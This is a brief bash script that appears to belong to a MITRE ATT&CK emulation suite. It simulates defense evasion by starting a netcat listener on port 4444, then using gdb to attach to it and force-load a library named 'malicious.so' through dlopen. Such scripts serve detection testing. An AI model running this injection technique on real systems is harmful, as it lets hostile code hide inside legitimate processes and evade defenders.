#!/bin/bash

# Define colors
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
BLUE="\e[34m"
CYAN="\e[36m"
RESET="\e[0m"

# Process Injection Technique
echo -e "${CYAN}\n>>> [Defense Evasion] Process Injection: Proc Memory Technique ${RESET}"
echo -e "${YELLOW}> Let's simulate the case when an attacker injects malicious code into the process ${RESET}"
echo -e "${BLUE}> TBD ${RESET}"

echo -e "${YELLOW}> Trying to inject malicious library into the process nc ... ${RESET}"
nc -lvp 4444 & pid=$!
if ! gdb -p $pid -ex 'call (void*) dlopen("/opt/mitre/07 Defense Evasion/malicious.so", 1)' -ex 'detach' -ex 'quit'; then
        echo -e "${RED}Error! Injection of malicious code was failed ${RESET}"
    else
        echo -e "${GREEN}Success! Malicious code was injected ${RESET}"
fi
